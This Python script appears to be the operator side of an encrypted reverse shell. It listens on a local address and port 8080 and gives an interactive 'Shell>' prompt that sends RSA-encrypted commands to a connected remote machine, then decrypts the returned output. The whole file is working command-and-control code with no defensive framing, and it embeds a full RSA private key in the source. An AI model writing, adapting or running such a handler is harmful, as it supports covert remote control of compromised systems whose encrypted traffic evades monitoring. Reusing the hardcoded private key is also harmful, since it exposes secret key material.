import socket
from Cryptodome.PublicKey import RSA
from Cryptodome.Cipher import PKCS1_OAEP

def encrypt(message):
    publickey = '''-----BEGIN PUBLIC KEY-----
MIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEAt9mjsBED9D/MYnU+W5+6
aP9SS1vgL9X6bThNkGKsZ5ZVfnoK4BxMBHI5Gi/YtoCJjyAGsWMpxy1fQ+F+ZWVA
kwZDoQMWTrfZASHmQgB944PfGA7qfn15kDXmCyvzbitRyWvTs1LDDNF7Q/54Qj82
h/85ibOPzQrpwQTjEAs8CJ14YWXAJnqOC6devaDYKdB7SSlueVtoQ8BxWc3hOJHJ
pvgZQ/6NixnICLIrFN0YbKZo4A0D3yRJIdumZw8uqwEMeIt41ja6zOG3gKtsG8su
BZ/MvqX0WgojWr6hNs1Q8h3LtiSsPiUP/bTWD9zos8Yr7RuEabesjHlY0qcNzZ/Y
gKXdgxUkCikTjRon6Mvh7iWKAtEilQlDeBYMGUvFUQ5FMF5LZJ5Q/7+JXulv8Whq
KTp4dGpB3kUWuN+ltxBr+IYPhpBfMcR97W+NuXDReUiIGFJpVI1m4AeCzz1BdAM7
U928DcglK6IowMmN4McyKuv49YYPd7TNFjJWc7P6e19V3BsxA5jpCc6Dxp5AM6WC
0FqgSSOGVCIkcHT5wLcALyaXOaO0vhMgWWO233Of33wh/7oHclsc5r44MHlZrNSe
X2QIHCFU4Mwp1hutIuIKkn5dLt1qmt2CDUO/uxGbdTf667c9TLYcYWoi/eDBdrVx
7CkYI7g81RdcB6jGgbr9W4kCAwEAAQ==
-----END PUBLIC KEY-----'''
    public_key = RSA.importKey(publickey)
    encryptor = PKCS1_OAEP.new(public_key)
    encryptedData = encryptor.encrypt(message)
    return encryptedData

def decrypt(cipher):
    privatekey = '''-----BEGIN RSA PRIVATE KEY-----
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
-----END RSA PRIVATE KEY-----'''
    private_key = RSA.importKey(privatekey)
    decryptor = PKCS1_OAEP.new(private_key)
    dec = decryptor.decrypt(cipher)
    return dec.decode()
def connect():
    s = socket.socket()
    s.bind(('192.168.0.152', 8080))
    s.listen(1)
    print('[+] Listening for incoming TCP connection on port 8080')
    conn, addr = s.accept()

    while True:
        store = ''
        command = input("Shell> ")
        if 'terminate' in command:
            conn.send('terminate'.encode())
            conn.close()
            break
        else:
            command = encrypt(command.encode())
            conn.send(command)
            result = conn.recv(1024)
            try:
                print(decrypt(result))
            except:
                print("[-] unable to decrypt/receive data!")

connect()

